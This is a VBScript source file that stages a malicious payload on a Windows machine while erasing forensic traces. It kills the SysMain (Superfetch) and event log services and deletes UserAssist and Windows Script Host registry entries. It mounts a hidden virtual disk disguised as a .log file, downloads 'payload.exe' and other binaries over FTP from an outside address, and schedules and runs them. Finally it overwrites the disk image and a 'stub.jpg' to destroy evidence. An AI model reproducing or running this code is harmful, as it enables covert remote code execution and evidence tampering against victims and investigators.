const HKEY_CURRENT_USER = &H80000001
const HKEY_LOCAL_MACHINE = &H80000002

Sub killSuperfetch()
        ' Kills the Superfetch process without generating file evidence
        ' Run resetSuperfetch after 5 minutes
        ' Will need to be combined with a Python process emulating Prefetch activity
        ' to avoid a suspicious lack of evidence
        
        Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}\\.\root\cimv2")
        Set procList = objWMIService.ExecQuery("Select * from Win32_Process")
        
        For Each proc in procList
                If proc.Name = "SysMain" Then
                        proc.Terminate()
                End If
        Next
        
        Set cmd = WScript.CreateObject("WScript.Shell")
        
        Set procList = objWMIService.ExecQuery("Select * from Win32_Service")
        
        For Each proc in procList
                If proc.Name = "SysMain" And proc.ProcessID <> 0 Then
                        cmd.Run("taskkill /f /pid " & proc.ProcessID)
                End If
        Next
        
        ' Make sure it doesn't get restarted by the Service Control Manager
        Set cmd = WScript.CreateObject("WScript.Shell")
        cmd.Run("sc config SysMain start= disabled")
End Sub

Sub resetSuperfetch()
        ' Sets the Superfetch service to start on startup again
        Set cmd = WScript.CreateObject("WScript.Shell")
        cmd.Run("sc config SysMain start= auto")
End Sub

Sub sendDiskpartCommand(diskpart, command)
        ' Interface to diskpart.exe, sends commands and waits for them to run
        diskpart.StdIn.Write command & VbCrLf
        If command = "exit" Then Exit Sub
        temp = ""
        Do Until InStr(temp, "DISKPART>") <> 0
                temp = diskpart.StdOut.ReadLine
        Loop
End Sub
Sub loadVDisk(path, size, letter)
        ' loads virtual disk, or creates it if it doesn't exist
        set fso = CreateObject("Scripting.FileSystemObject")
        set cmd = WScript.CreateObject("WScript.Shell")
        exists = fso.FileExists(path)
        set diskpart = cmd.Exec("diskpart.exe")
        
        If exists Then
                sendDiskpartCommand diskpart, "select vdisk file=""" & path & """"
                sendDiskpartCommand diskpart, "attach vdisk"
                sendDiskpartCommand diskpart, "assign letter=" & letter
                sendDiskpartCommand diskpart, "exit"
        Else
                sendDiskpartCommand diskpart, "create vdisk file=""" & path & """ maximum=" & size
                sendDiskpartCommand diskpart, "select vdisk file=""" & path & """"
                sendDiskpartCommand diskpart, "attach vdisk"
                sendDiskpartCommand diskpart, "create partition primary"
                sendDiskpartCommand diskpart, "format fs=fat quick"
                sendDiskpartCommand diskpart, "assign letter=" & letter
                sendDiskpartCommand diskpart, "exit"
        End If
End Sub

Sub unloadVDisk(path, letter)
        ' Unloads a virtual disk loaded with loadVDisk
        set cmd = WScript.CreateObject("WScript.Shell")
        set diskpart = cmd.Exec("diskpart.exe")
        sendDiskpartCommand diskpart, "select vdisk file=""" & path & """"
        sendDiskpartCommand diskpart, "remove letter=" & letter
        sendDiskpartCommand diskpart, "detach vdisk"
        sendDiskpartCommand diskpart, "exit"
End Sub

Sub secureDelete(folder, filename)
        ' Securely deletes a file by overwriting its contents with a file with the same extension
        On Error Resume Next
        set fso = CreateObject("Scripting.FileSystemObject")
        extension = fso.GetExtensionName(filename)
        
        For Each potentialFile in fso.GetFolder(folder).Files
                If fso.GetExtensionName(potentialFile.Name) = extension And potentialFile.Name <> filename Then
                        Set stream = CreateObject("Adodb.Stream")
                        stream.Type = 1
                        stream.Open
                        stream.LoadFromFile(folder & potentialFile.Name)
                        If Err.Number <> 0 Then
                                stream.Close
                                WScript.Sleep 100
                                secureDelete folder, filename
                                Exit Sub
                        End If
                        stream.SaveToFile folder & filename, 2
                        If Err.Number <> 0 Then
                                stream.Close
                                WScript.Sleep 100
                                secureDelete folder, filename
                                Exit Sub
                        End If
                        stream.Close
                        
                        Exit Sub
                End If
        Next
        
        
End Sub

Sub restartEventLog()
        ' restarts the eventlog
        ' Use in conjunction with a Python function which removes incriminating entries from the log
        
        Set cmd = WScript.CreateObject("WScript.Shell")
        
        Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}\\.\root\cimv2")
        Set procList = objWMIService.ExecQuery("Select * from Win32_Service")
        
        For Each proc in procList
                If proc.Name = "eventlog" And proc.ProcessID <> 0 Then
                        cmd.Run("taskkill /f /pid " & proc.ProcessID)
                End If
        Next
End Sub
Sub killProgram(name)
        Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}\\.\root\cimv2")
        Set procList = objWMIService.ExecQuery("Select * from Win32_Process")
        
        For Each proc in procList
                If proc.Name = name Then
                        proc.Terminate()
                End If
        Next
End Sub

Function regRead(hive, path, value)
        Set reg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
        reg.GetStringValue hive,path,value,return
        regRead = return
End Function

Sub regDeleteValue(hive, path, value)
        Set reg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
        reg.DeleteValue hive,path,value
End Sub

Sub regDeleteKey(hive, path)
        Set reg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
        reg.EnumKey hive, path, subkeys 
        If IsArray(subkeys) Then 
                For Each subkey In subkeys 
                        regDeleteKey hive, path & "\" & subkey 
                Next 
        End If 
        reg.DeleteKey hive,path
End Sub

Function rot13(string)
        ' Implements ROT13 code, useful for UserAssist encoding/decoding
        alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMabcdefghijklmnopqrstuvwxyzabcdefghijklm"
        rot13 = ""
        For position = 1 to Len(string)
                character = Mid(string, position, 1)
                letter = Instr(alphabet, character)
                If letter = 0 Then ' Not a letter
                        rot13 = rot13 & character
                Else
                        rot13 = rot13 & Mid(alphabet, letter + 13, 1)
                End If
        Next
End Function


Sub deleteRegistryEntries(path, letter)
        On Error Resume Next
        ' Immediately delete Registry entries which would indicate this VBS file or an exe has been run,
        ' before they can be flushed to disk
        regDeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\" & _
                "{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count", "{1NP14R77-02R7-4R5Q-O744-2RO1NR5198O7}\" & rot13(path)
        regDeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\" & _
                "{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count", rot13(letter) & ":\" & rot13(path)
        regDeleteKey HKEY_CURRENT_USER, "Software\Microsoft\Windows Script Host"
        regDeleteKey HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Tracing\wscript_RASAPI32" 
        regDeleteKey HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Tracing\wscript_RASMANCS"
End Sub

Sub sendFTPCommand(ftp, command)
        ' Interface to ftp.exe, sends commands and waits for them to run
        ftp.StdIn.Write command & VbCrLf
        If command = "quit" Then Exit Sub
End Sub

Sub downloadCode(ip, letter, fileArray)
        ' Download binaries to the virtual disk
        
        set cmd = WScript.CreateObject("WScript.Shell")
        set ftp = cmd.Exec("ftp.exe -A " & ip)
        
        sendFTPCommand ftp, "quote pasv"
        sendFTPCommand ftp, "binary"
        sendFTPCommand ftp, "lcd " & letter & ":\"
        
        For Each file in fileArray
                sendFTPCommand ftp, "get " & file
        Next
        
        sendFTPCommand ftp, "quit"
        
End Sub
Sub deletePayloadEvidence()
        ' Add delete statements for payload evidence here
End Sub

Set cmd = WScript.CreateObject("WScript.Shell")

deleteRegistryEntries "wscript.exe", "C" ' run this ASAP
killSuperfetch ' run this before 10 seconds
loadVDisk "C:\Windows\Temp\01189998819991197253.log", 10, "M"


downloadCode "192.168.1.113", "M", Array("monitor.exe","_hashlib.pyd","bz2.pyd","library.zip", _
        "python27.dll","select.pyd", "unicodedata.pyd", "w9xpopen.exe", "payload.exe", "sys.vbs")

WScript.Sleep 65000
resetSuperfetch
WScript.Sleep 5000
Do Until Second(Now()) = 30
        WScript.Sleep 1000
Loop
' Set sys.vbs to run in 30 seconds
cmd.Run("at " & Hour(DateAdd("n",1,Now()))&":"&Minute(DateAdd("n",1,Now())) & " wscript /e:vbs M:\sys.vbs")
WScript.Sleep 30000
restartEventLog ' run within 5 minutes

WScript.Sleep 25000
deleteRegistryEntries "monitor.exe", "M"
WScript.Sleep 20000

cmd.Run("M:\payload.exe")
deleteRegistryEntries "payload.exe", "M"
WScript.Sleep 1000
deletePayloadEvidence

WScript.Sleep 1200000 ' give the payload 20 minutes to do evil

killProgram "payload.exe"
deleteRegistryEntries "payload.exe", "M"
deletePayloadEvidence
WScript.Sleep 5000
deleteRegistryEntries "monitor.exe", "M"
WScript.Sleep 5000


unloadVDisk "C:\Windows\Temp\01189998819991197253.log", "M"
WScript.Sleep 20000
secureDelete "C:\Windows\Temp\", "01189998819991197253.log"
secureDelete "C:\Users\Alpha\", "stub.jpg"

